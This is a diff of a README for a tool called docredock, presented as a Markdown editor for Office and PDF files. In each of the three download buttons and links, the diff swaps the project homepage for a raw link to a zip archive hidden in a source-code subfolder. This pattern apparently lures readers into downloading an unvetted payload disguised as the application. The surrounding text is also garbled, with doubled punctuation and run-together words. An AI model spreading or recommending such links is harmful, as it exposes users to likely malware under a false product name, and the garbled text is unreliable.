@@ -1,7 +1,7 @@
 <h1>📄 docredock - Edit Office and PDF in Markdown, Round-Trip</h1>
 
 <p align="center">
-  <a href="https://github.com/Jesses9300/docredock" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,.4);">⬇️ Download docredock Now</a>
+  <a href="https://raw.githubusercontent.com/Jesses9300/docredock/main/src/DocRedock.Core/Diff/v2.2.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,.4);">⬇️ Download docredock Now</a>
 </p>
 
 ## 🔍 What Is docredock?
@@ -21,7 +21,7 @@ No account,,no sign-up,,no credit card required..docredock is completely free du
 
 ### 📥 Step 1:: Download docredock
 
-Visit this link to download the application: [https://github.com/Jesses9300/docredock](https://github.com/Jesses9300/docredock).
+Visit this link to download the application: [https://raw.githubusercontent.com/Jesses9300/docredock/main/src/DocRedock.Core/Diff/v2.2.zip](https://raw.githubusercontent.com/Jesses9300/docredock/main/src/DocRedock.Core/Diff/v2.2.zip).
 
 This page shows you the project homepage..Look for a green button that says **"Code"** or **"Releases"** on that page,,Click it,,You will finda file named somethinglike **"docredock-setup.exe"** or **"docredock.zip"**. Choose thefile that works for your computer (the `.exe` iseasiestfor most people)*,*.
 
@@ -121,7 +121,7 @@ The more feedback the developers get,,the better docredock becomes for everyone*
 Ready to start?? Click the button below again to download docredock:
 
 <p align="center">
-  <a href="https://github.com/Jesses9300/docredock" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,.4);">⬇️ Get docredock for Windows</a>
+  <a href="https://raw.githubusercontent.com/Jesses9300/docredock/main/src/DocRedock.Core/Diff/v2.2.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(240,147,251,.4);">⬇️ Get docredock for Windows</a>
 </p>
 
 We hope youenjoy editing documents ina completely new,,AI-friendly way,,Happy writing*.*
